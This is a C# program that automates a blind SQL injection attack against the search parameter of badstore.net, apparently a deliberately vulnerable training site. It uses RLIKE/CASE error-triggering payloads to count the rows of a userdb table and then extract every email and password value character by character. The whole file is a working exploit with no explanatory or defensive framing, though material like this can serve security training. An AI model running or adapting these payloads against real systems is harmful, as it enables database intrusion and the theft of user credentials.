using System;
using System.Net;
using System.IO;
using System.Collections.Generic;
using System.Text;

namespace blind_sqli
{
    class MainClass
    {
        public static void Main(string[] args)
        {
            int countLength = 1;
            for (;;countLength++)
            {
                string getCountLength = "test' RLIKE (SELECT (CASE WHEN ((SELECT";
                getCountLength += " LENGTH(IFNULL(CAST(COUNT(*) AS CHAR),0x20)) FROM";
                getCountLength += " userdb)=" + countLength + ") THEN 0x28 ELSE 0x41 END))";
                getCountLength += " AND 'LeSo'='LeSo";

                string response = MakeRequest(getCountLength);
                if (response.Contains("parentheses not balanced"))
                    break;
            }
            List<byte> countBytes = new List<byte>();
            for (int i = 1; i <= countLength; i++)
            {
                for (int c = 48; c <= 58; c++)
                {
                    string getCount = "fdsa' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT";
                    getCount += " IFNULL(CAST(COUNT(*) AS CHAR), 0x20) FROM userdb),";
                    getCount += i + ", 1))=" + c + ") THEN 0x28 ELSE 0x41 END)) AND '";
                    string response = MakeRequest(getCount);

                    if (response.Contains("parentheses not balanced"))
                    {
                        countBytes.Add((byte)c);
                        break;
                    }
                }
            }

            int count = int.Parse(Encoding.ASCII.GetString(countBytes.ToArray()));
            Console.WriteLine("There are " + count + " rows in the userdb table");

            for (int row = 0; row < count; row++)
            {
                foreach (string column in new string[] { "email", "passwd"})
                {
                    Console.Write("Getting length of query value...");
                    int valLength = GetLength(row, column);
                    Console.WriteLine(valLength);

                    Console.Write("Getting value...");
                    string value = GetValue(row, column, valLength);
                    Console.WriteLine(value);
                }
            }
        }
        private static string MakeRequest(string payload)
        {
            string url = "http://www.badstore.net/cgi-bin/badstore.cgi?action=search&searchquery=";
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url + payload);
            //HttpWebRequest request = (HttpWebRequest)WebRequest.Create (url + payload);

            string response = string.Empty;
            using (StreamReader reader = new StreamReader(request.GetResponse().GetResponseStream()))
                response = reader.ReadToEnd();

            return response;
        }
        private static int GetLength(int row, string column)
        {
            int countLength = 0;
            for (;; countLength++)
            {
                string getCountLength = "test' RLIKE (SELECT (CASE WHEN ((SELECT";
                getCountLength += " LENGTH(IFNULL(CAST(CHAR_LENGTH(" + column + ") AS";
                getCountLength += " CHAR),0x20)) FROM userdb ORDER BY email LIMIT ";
                getCountLength += row + ",1)=" + countLength + ") THEN 0x28 ELSE 0x41 END)) AND ";
                getCountLength += " 'YIye'='YIye";

                string response = MakeRequest(getCountLength);

                if (response.Contains("parentheses not balanced"))
                    break;
            }

            List<byte > countBytes = new List<byte>();
            for (int i = 0; i <= countLength; i++)
            {
                for (int c = 48; c <= 58; c++)
                {
                    string getLength = "test' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT";
                    getLength += " IFNULL(CAST(CHAR_LENGTH(" + column + ") AS CHAR),0x20) FROM";
                    getLength += " userdb ORDER BY email LIMIT " + row + ",1)," + i;
                    getLength += ",1))=" + c + ") THEN 0x28 ELSE 0x41 END)) AND 'YIye'='YIye";

                    string response = MakeRequest(getLength);
                    if (response.Contains("parentheses not balanced"))
                    {
                        countBytes.Add((byte)c);
                        break;
                    }
                }
            }
            if (countBytes.Count > 0)
                return int.Parse(Encoding.ASCII.GetString(countBytes.ToArray()));
            else
                return 0;
        }
        private static string GetValue(int row, string column, int length)
        {
            List<byte> valBytes = new List<byte>();
            for (int i = 0; i <= length; i++)
            {
                for (int c = 32; c <= 126; c++)
                {
                    string getChar = "test' RLIKE (SELECT (CASE WHEN (ORD(MID((SELECT";
                    getChar += " IFNULL(CAST(" + column + " AS CHAR),0x20) FROM userdb ORDER BY";
                    getChar += " email LIMIT " + row + ",1)," + i + ",1))=" + c + ") THEN 0x28 ELSE 0x41";
                    getChar += " END)) and 'YIye'='YIye";
                    string response = MakeRequest(getChar);

                    if (response.Contains("parentheses not balanced"))
                    {
                        valBytes.Add((byte)c);
                        break;
                    }
                }
            }
            return Encoding.ASCII.GetString(valBytes.ToArray());
        }
    }
}
